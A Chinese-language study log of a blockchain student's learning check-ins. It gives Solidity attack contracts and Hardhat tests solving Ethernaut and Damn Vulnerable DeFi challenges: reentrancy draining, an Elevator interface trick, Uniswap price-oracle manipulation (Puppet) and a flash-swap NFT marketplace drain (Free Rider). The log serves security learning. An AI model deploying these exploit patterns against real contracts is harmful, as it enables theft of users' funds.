---
timezone: Pacific/Auckland
---

> 请在上边的 timezone 添加你的当地时区，这会有助于你的打卡状态的自动化更新，如果没有添加，默认为北京时间 UTC+8 时区
> 时区请参考以下列表，请移除 # 以后的内容

timezone: Pacific/Honolulu # 夏威夷-阿留申标准时间 (UTC-10)

timezone: America/Anchorage # 阿拉斯加标准时间 (UTC-9)

timezone: America/Los_Angeles # 太平洋标准时间 (UTC-8)

timezone: America/Denver # 山地标准时间 (UTC-7)

timezone: America/Chicago # 中部标准时间 (UTC-6)

timezone: America/New_York # 东部标准时间 (UTC-5)

timezone: America/Halifax # 大西洋标准时间 (UTC-4)

timezone: America/St_Johns # 纽芬兰标准时间 (UTC-3:30)

timezone: America/Sao_Paulo # 巴西利亚时间 (UTC-3)

timezone: Atlantic/Azores # 亚速尔群岛时间 (UTC-1)

timezone: Europe/London # 格林威治标准时间 (UTC+0)

timezone: Europe/Berlin # 中欧标准时间 (UTC+1)

timezone: Europe/Helsinki # 东欧标准时间 (UTC+2)

timezone: Europe/Moscow # 莫斯科标准时间 (UTC+3)

timezone: Asia/Dubai # 海湾标准时间 (UTC+4)

timezone: Asia/Kolkata # 印度标准时间 (UTC+5:30)

timezone: Asia/Dhaka # 孟加拉国标准时间 (UTC+6)

timezone: Asia/Bangkok # 中南半岛时间 (UTC+7)

timezone: Asia/Shanghai # 中国标准时间 (UTC+8)

timezone: Asia/Taipei # 台灣标准时间 (UTC+8)

timezone: Asia/Tokyo # 日本标准时间 (UTC+9)

timezone: Australia/Sydney # 澳大利亚东部标准时间 (UTC+10)

timezone: Pacific/Auckland # 新西兰标准时间 (UTC+12)

---

# {你的名字}

1. 自我介绍
   一个区块链工程专业的国内在读本科生，关注密码学和合约审计安全
2. 你认为你会完成本次残酷学习吗？
   包的
## Notes

<!-- Content_START -->

### 2024.08.29

回顾了一下ethernaut前面的题目：
11. 
pragma solidity ^0.7;
interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}
contract Hack { 
    IReentrancy private immutable target;
    constructor(address _target){
        target =IReentrancy(_target);
    }
    function attack() external payable{
        //这个合约一开始先给被攻击合约转入1wei
        target.donate{value:1e18}(address(this));
        //这个用法表达的意思为调用这个函数并且传递自己合约的地址
        target.withdraw(1e18);
        require (address(target).balance==0,"target balance>0");
        selfdestruct(payable(msg.sender));
    }
    receive() external payable{
        uint amount=min(1e18,address(target).balance);
        if(amount>0){
        target.withdraw(amount);//这里再重入攻击
        }
    }
    function min(uint x,uint y) private pure returns (uint){
        return x<=y?x:y;
    }
}


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
    contract Hack {
        Elevator private immutable target;
        uint private count=0;
        constructor(address _target){
            target=Elevator(_target);
        }
        function pwn()external {
            target.goTo(1);
            require(target.top(),"not top");
        }
        function isLastFloor(uint) external returns (bool){
            count++;
            return count>1;
        }
        
    }

12. 
interface Building {
  function isLastFloor(uint) external returns (bool);
}
//这边这个合约的接口是一个判断是不是顶楼的，这边其实不重要
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);
//这边给Building的接口了一个地址--就是攻击合约的地址
    if (! building.isLastFloor(_floor)) {//由于这里没有对这个函数定义，所以自己写一个合约来进行攻击
      floor = _floor;
      top = building.isLastFloor(floor);//这题判断是不是成功就是看这个地方top的值是不是true
    }
  }
}
### 2024.08.30
做了damn靶场，把前九题写完了，这里放第puppet这题的吧
下面是攻击合约
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
}

interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
}


contract AttackPuppet {

    uint256 constant SELL_DVT_AMOUNT = 1000 ether;
    uint256 constant DEPOSIT_FACTOR = 2;
    uint256 constant BORROW_DVT_AMOUNT = 100000 ether;
    
    IUniswapExchangeV1 immutable exchange;
    IERC20 immutable token;
    IPool immutable pool;
    address immutable player;

    constructor(address _token, address _pair, address _pool){
        token = IERC20(_token);
        exchange = IUniswapExchangeV1(_pair);
        pool = IPool(_pool);
        player = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == player);

        // Dump DVT to the Uniswap Pool
        token.approve(address(exchange), SELL_DVT_AMOUNT);
        exchange.tokenToEthTransferInput(SELL_DVT_AMOUNT, 9, block.timestamp, address(this));

        // Calculate required collateral
        uint256 price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
        uint256 depositRequired = BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR / 10 ** 18;

        console.log("contract ETH balance: ", address(this).balance);
        console.log("DVT price: ", price);
        console.log("Deposit Required: ", depositRequired);

        // Borrow and steal the DVT
        pool.borrow{value: depositRequired}(BORROW_DVT_AMOUNT, player);
    }

    receive() external payable {}
}
下面是测试文件：
const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
}

describe('[Challenge] Puppet', function () {
    let deployer, player;
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
        
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetPool', deployer)).deploy(
            token.address,
            uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                10n ** 18n,
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                10n ** 18n,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(10n ** 18n)
        ).to.be.eq(2n * 10n ** 18n);

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        [,,this.player2] = await ethers.getSigners();


        const AttackerContractFactory = await ethers.getContractFactory('AttackPuppet', this.player2);
        this.attackerContract = await AttackerContractFactory.deploy(
            token.address, uniswapExchange.address, lendingPool.address
        )

        token.connect(player).transfer(this.attackerContract.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await this.attackerContract.attack({value: 11n * 10n ** 18n});
        await token.connect(this.player2).transfer(player.address, await token.balanceOf(this.player2.address));

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player executed a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
        
        // Player has taken all tokens from the pool       
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0, 'Pool still has tokens');

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
    });
});
### 2024.08.31
damn第十题
下面是攻击合约
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackFreeRider {

    IUniswapV2Pair private immutable pair;
    IMarketplace private immutable marketplace;

    IWETH private immutable weth;
    IERC721 private immutable nft;

    address private immutable recoveryContract;
    address private immutable player;

    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract){
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {

        // 1. Request a flashSwap of 15 WETH from Uniswap Pair
        bytes memory data = abi.encode(NFT_PRICE);
        pair.swap(NFT_PRICE, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        // Access Control
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 2. Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);

        // 3. Buy 6 NFTS for only 15 ETH total
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // 4. Pay back 15WETH + 0.3% to the pair contract
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);

        // 5. Send NFTs to recovery contract so we can get the bounty
        bytes memory data = abi.encode(player);
        for(uint256 i; i < tokens.length; i++){
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }
        
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }


    receive() external payable {}

}

下面是测试文件
// Get compiled Uniswap v2 data
const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Free Rider', function () {
    let deployer, player, devs;
    let weth, token, uniswapFactory, uniswapRouter, uniswapPair, marketplace, nft, devsContract;

    // The NFT marketplace will have 6 tokens, at 15 ETH each
    const NFT_PRICE = 15n * 10n ** 18n;
    const AMOUNT_OF_NFTS = 6;
    const MARKETPLACE_INITIAL_ETH_BALANCE = 90n * 10n ** 18n;
    
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;

    const BOUNTY = 45n * 10n ** 18n;

    // Initial reserves for the Uniswap v2 pool
    const UNISWAP_INITIAL_TOKEN_RESERVE = 15000n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 9000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player, devs] = await ethers.getSigners();

        // Player starts with limited ETH balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy WETH
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy token to be traded against WETH in Uniswap v2
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await (new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)).deploy(
            ethers.constants.AddressZero // _feeToSetter
        );
        uniswapRouter = await (new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer)).deploy(
            uniswapFactory.address,
            weth.address
        );
        
        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // The function takes care of deploying the pair automatically
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,                                              // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        
        // Get a reference to the created Uniswap pair
        uniswapPair = await (new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)).attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapPair.token0()).to.eq(weth.address);
        expect(await uniswapPair.token1()).to.eq(token.address);
        expect(await uniswapPair.balanceOf(deployer.address)).to.be.gt(0);

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = await (await ethers.getContractFactory('FreeRiderNFTMarketplace', deployer)).deploy(
            AMOUNT_OF_NFTS,
            { value: MARKETPLACE_INITIAL_ETH_BALANCE }
        );

        // Deploy NFT contract
        nft = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await marketplace.token());
        expect(await nft.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nft.rolesOf(marketplace.address)).to.eq(await nft.MINTER_ROLE());

        // Ensure deployer owns all minted NFTs. Then approve the marketplace to trade them.
        for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
            expect(await nft.ownerOf(id)).to.be.eq(deployer.address);
        }
        await nft.setApprovalForAll(marketplace.address, true);

        // Open offers in the marketplace
        await marketplace.offerMany(
            [0, 1, 2, 3, 4, 5],
            [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
        );
        expect(await marketplace.offersCount()).to.be.eq(6);

        // Deploy devs' contract, adding the player as the beneficiary
        devsContract = await (await ethers.getContractFactory('FreeRiderRecovery', devs)).deploy(
            player.address, // beneficiary
            nft.address, 
            { value: BOUNTY }
        );
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const FreeRiderAttacker = await ethers.getContractFactory("AttackFreeRider", player);
        this.attackerContract = await FreeRiderAttacker.deploy(
            uniswapPair.address, marketplace.address, weth.address,
            nft.address, devsContract.address
        );

        await this.attackerContract.attack({value: ethers.utils.parseEther("0.045")});
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // The devs extract all NFTs from its associated contract
        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            await nft.connect(devs).transferFrom(devsContract.address, devs.address, tokenId);
            expect(await nft.ownerOf(tokenId)).to.be.eq(devs.address);
        }

        // Exchange must have lost NFTs and ETH
        expect(await marketplace.offersCount()).to.be.eq(0);
        expect(
            await ethers.provider.getBalance(marketplace.address)
        ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        expect(await ethers.provider.getBalance(player.address)).to.be.gt(BOUNTY);
        expect(await ethers.provider.getBalance(devsContract.address)).to.be.eq(0);
    });
});

### 2024.07.12

<!-- Content_END -->
